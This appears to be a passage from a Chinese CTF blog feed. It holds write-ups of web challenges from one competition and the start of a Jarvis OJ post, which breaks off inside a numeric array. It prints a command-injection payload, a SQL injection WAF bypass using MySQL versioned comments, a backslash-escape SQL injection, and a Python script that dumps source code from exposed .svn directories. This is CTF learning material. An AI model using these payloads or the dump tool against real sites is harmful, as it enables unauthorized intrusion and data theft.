class="number">0x7D</span>,<span class="number">0x0FA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0x0F0</span>,<span class="number">0x0AD</span>,<span class="number">0x0D4</span>,<span class="number">0x0A2</span>,<span class="number">0x0AF</span>,<span class="number">0x9C</span>,<span class="number">0x0A4</span>,<span class="number">0x72</span>,<span class="number">0x0C0</span>,<span class="number">0x0B7</span>,<span class="number">0x0FD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0x0F7</span>,<span class="number">0x0CC</span>,<span class="number">0x34</span>,<span class="number">0x0A5</span>,<span class="number">0x0E5</span>,<span class="number">0x0F1</span>,<span class="number">0x71</span>,<span class="number">0x0D8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x4</span>,<span class="number">0x0C7</span>,<span class="number">0x23</span>,<span class="number">0x0C3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x9A</span>,<span class="number">0x7</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0x0E2</span>,<span class="number">0x0EB</span>,<span class="number">0x27</span>,<span class="number">0x0B2</span>,<span class="number">0x75</span>,<span class="number">0x9</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0x0A0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0x0D6</span>,<span class="number">0x0B3</span>,<span class="number">0x29</span>,<span class="number">0x0E3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0x0D1</span>,<span class="number">0x0</span>,<span class="number">0x0ED</span>,<span class="number">0x20</span>,<span class="number">0x0FC</span>,<span class="number">0x0B1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0x0CB</span>,<span class="number">0x0BE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0x0CF</span>,<span class="number">0x0D0</span>,<span class="number">0x0EF</span>,<span class="number">0x0AA</span>,<span class="number">0x0FB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0x0F9</span>,<span class="number">0x2</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0x0A8</span>,<span class="number">0x51</span>,<span class="number">0x0A3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0x0F5</span>,<span class="number">0x0BC</span>,<span class="number">0x0B6</span>,<span class="number">0x0DA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x0FF</span>,<span class="number">0x0F3</span>,<span class="number">0x0D2</span>,<span class="number">0x0CD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0x0EC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0x0C4</span>,<span class="number">0x0A7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0x0DC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0x0EE</span>,<span class="number">0x0B8</span>,<span class="number">0x14</span>,<span class="number">0x0DE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0x0DB</span>,<span class="number">0x0E0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x6</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x0C2</span>,<span class="number">0x0D3</span>,<span class="number">0x0AC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0x0E4</span>,<span class="number">0x79</span>,<span class="number">0x0E7</span>,<span class="number">0x0C8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0x0D5</span>,<span class="number">0x4E</span>,<span class="number">0x0A9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0x0F4</span>,<span class="number">0x0EA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x0AE</span>,<span class="number">0x8</span>,<span class="number">0x0BA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0x0A6</span>,<span class="number">0x0B4</span>,<span class="number">0x0C6</span>,<span class="number">0x0E8</span>,<span class="number">0x0DD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0x0BD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0x0B5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x3</span>,<span class="number">0x0F6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x0B9</span>,<span class="number">0x86</span>,<span class="number">0x0C1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0x0E1</span>,<span class="number">0x0F8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0x0D9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0x0E9</span>,<span class="number">0x0CE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0x0DF</span>,<span class="number">0x8C</span>,<span class="number">0x0A1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0x0BF</span>,<span class="number">0x0E6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0x0B0</span>,<span class="number">0x54</span>,<span class="number">0x0BB</span>,<span class="number">0x16</span>]</div><div class="line">b = <span class="string">"bb3ccfb0213965aed24b9264ae4bbb92543954bb0739bbbbcf64f554cff5f365f565f386"</span>.decode(<span class="string">"hex"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> b:</div><div class="line">    d = ord(x) ^ <span class="number">0x88</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0x0</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="comment"># print (y &amp;0xf)+(y &gt;&gt; 4)*2</span></div><div class="line">        <span class="keyword">if</span> a[(y &gt;&gt; <span class="number">4</span>)+<span class="number">8</span>*((y &amp;<span class="number">0xf</span>)*<span class="number">2</span>)] == d:</div><div class="line">            flag += chr(y)</div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"><span class="comment"># flag&#123;e52d34823f49e9f7effa819a105150&#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>web弱渣就算碰到送分题也不会啊，通过提示和提供的密码本，原来考察点是在于弱口令ORZ （好吧，服了，一直拿sql在注，返回速度还特别慢），用burp加载top 10 password（原来还有这种东西），爆破登录界面得到flag。</p>
<h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>秒做的题目, payload <code>127.0.0.1;cat flag</code> 命令执行绕过有很多姿势，但遗憾的是这边没有过滤。 </p>
<h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p>waf这题题目其实一开始也不会的，也是通过提示来过的，黑盒测试发现waf拦截许多东西，最为关键的就是 union select，所以想办法绕过，经过N次测试，发现<code>/*!50000select*/</code> 不会被waf拦截，于是构造<code>%27/*!50000union*/%0a/*!50000select*/%0aflag%0a/*!50000from*/flag%23</code> 得到flag</p>
<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>好像是叫这个名字？忘了，赛后听说是admin，密码是123456，然后进去一系列骚操作获取flag，又是考弱口令啊啊啊啊啊啊</p>
<h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><p>也是赛后得知的，考察通过markdown的ssrf来获取信息，语法是<code>![](flag.php)</code>，flag的文件名需要通过robots.txt文件来获取，构造即可从源码中获得到flag信息。</p>
<h3 id="box"><a href="#box" class="headerlink" title="box"></a>box</h3><p>也是赛后得知的，听说是全国大学生信安赛的<code>wanna to see your hat</code> ,（蜜汁微笑，技术支持真懒）。不过作为biner，当时比赛的时候，没去碰这题题目，没做出来，认了。。。。赛后复现如下。</p>
<p>拿weakfilescan扫描以下敏感文件，发现存在svn泄漏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">--------------------------------------------------</div><div class="line">* scan http://123.59.52.228:1515 start</div><div class="line">--------------------------------------------------</div><div class="line">[200] http://123.59.52.228:1515 =&gt; http://123.59.52.228:1515/route.php?act=index</div><div class="line">[200] http://123.59.52.228:1515/.svn/entries =&gt; http://123.59.52.228:1515/.svn/entries</div><div class="line">--------------------------------------------------</div><div class="line">* scan complete...</div><div class="line">--------------------------------------------------</div><div class="line">&#123;</div><div class="line">  &quot;dirs&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: [</div><div class="line">      &quot;http://123.59.52.228:1515/&quot;</div><div class="line">    ]</div><div class="line">  &#125;, </div><div class="line">  &quot;files&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: &#123;</div><div class="line">      &quot;/.svn/&quot;: [</div><div class="line">        &quot;http://123.59.52.228:1515/.svn/entries&quot;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用svn.py将源码dump下来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python      </span></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line">__author__ = <span class="string">'Rivir'</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">'''</span></div><div class="line"> ----</div><div class="line">    _____               ______            __    </div><div class="line">  / ___/   ______     /_  __/___  ____  / /____</div><div class="line">  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/</div><div class="line"> ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) </div><div class="line">/____/|___/_/ /_/    /_/  \____/\____/_/____/  </div><div class="line">                author: Rivir</div><div class="line"> ----</div><div class="line">\                             .       .</div><div class="line"> \                           / `.   .' " </div><div class="line">  \                  .---.  &lt;    &gt; &lt;    &gt;  .---.</div><div class="line">   \                 |    \  \ - ~ ~ - /  /    |</div><div class="line">         _____          ..-~             ~-..-~</div><div class="line">        |     |   \~~~\.'                    `./~~~/</div><div class="line">       ---------   \__/                        \__/</div><div class="line">      .'  O    \     /               /       \  " </div><div class="line">     (_____,    `._.'               |         &#125;  \/~~~/</div><div class="line">      `----.          /       &#125;     |        /    \__/</div><div class="line">            `-.      |       /      |       /      `. ,~~|</div><div class="line">                ~-.__|      /_ - ~ ^|      /- _      `..-'   </div><div class="line">                     |     /        |     /     ~-.     `-. _  _  _</div><div class="line">                     |_____|        |_____|         ~ - . _ _ _ _ _&gt;</div><div class="line"> </div><div class="line">'''</div><div class="line"> </div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'wc.db'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        content = requests.get(url=url+<span class="string">'/.svn/wc.db'</span>,headers=headers).content</div><div class="line">        f.write(content)</div><div class="line"> </div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> file:</div><div class="line">        info = os.popen(<span class="string">"""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'"""</span>).read()</div><div class="line">        <span class="comment">#print info</span></div><div class="line">        file.write(info)</div><div class="line"> </div><div class="line">    os.remove(<span class="string">'wc.db'</span>)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_svn</span><span class="params">(url)</span>:</span></div><div class="line">    getfilename(url)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn'</span>):</div><div class="line">        os.mkdir(<span class="string">'svn'</span>)</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> f:</div><div class="line">            tmp = file.strip().split(<span class="string">'|'</span>)</div><div class="line">            <span class="comment">#print tmp</span></div><div class="line">            <span class="keyword">if</span> len(tmp) == <span class="number">1</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            name = tmp[<span class="number">0</span>]</div><div class="line">            path = tmp[<span class="number">1</span>]</div><div class="line">            <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> name:</div><div class="line">                book = os.path.dirname(name)</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn/'</span>+book):</div><div class="line">                    os.makedirs(<span class="string">'./svn/'</span>+book)</div><div class="line"> </div><div class="line"> </div><div class="line">            <span class="keyword">print</span> <span class="string">'download:'</span>,<span class="string">'./svn/'</span>+name</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'./svn/'</span>+name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">                    req = requests.get(url+path,headers=headers)</div><div class="line">                    f.write(req.content)</div><div class="line">            <span class="keyword">except</span> Exception,e:</div><div class="line">                <span class="comment">#print e </span></div><div class="line">                <span class="keyword">pass</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    restore_svn(sys.argv[<span class="number">-1</span>])</div></pre></td></tr></table></figure>
<p>发现flag.php文件，然而并没有什么软用。发现<code>index.php</code>中，如果<code>$_SESSION[&quot;hat&quot;]</code> == <code>&quot;black&quot;</code> 会输出flag，所以我们希望找到一个地方，这个地方是给<code>$_SESSION[&quot;hat&quot;]</code>赋予<code>&quot;black&quot;</code>字符串的，我们在login.php中找到了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">   <span class="keyword">echo</span> $sql;</div><div class="line">   $result = mysql_query($sql);</div><div class="line">   $row = mysql_fetch_array($result);</div><div class="line">   <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">     $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">     <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>这边有个坑，reg那个页面中所用的表和login页面中登录的表不一样。。所以无论怎么注册都没用，需要选手绕过waf来注入。。。</p>
<p>waf规则</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>$_POST首先会被全局转义，故而会多出个反斜杠，这边waf替换掉了单引号，但是没有替换掉反斜杠，导致反斜杠的特殊利用。</p>
<p><code>select count(*) from t_info where username = &#39;||1#\&#39; or nickname = &#39;||1#\&#39;</code></p>
<p>转到index页面获取flag</p>
<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>???这waf太强啦，真不会啊~</p>
<p>跪求大佬的wp</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>此次比赛网络环境确实不是很好，所以对于做离线题目的选手要有利的多，离线的环境。做web题的时候，用weakfilescan来发现敏感文件，发现这玩意不支持302，真坑啊。</p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【web】jarvis oj 刷题]]></title>
      <url>/2017/06/17/jarvisoj-web/</url>
      <content type="html"><![CDATA[<h3 id="web？"><a href="#web？" class="headerlink" title="web？"></a>web？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> np</div><div class="line">o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span 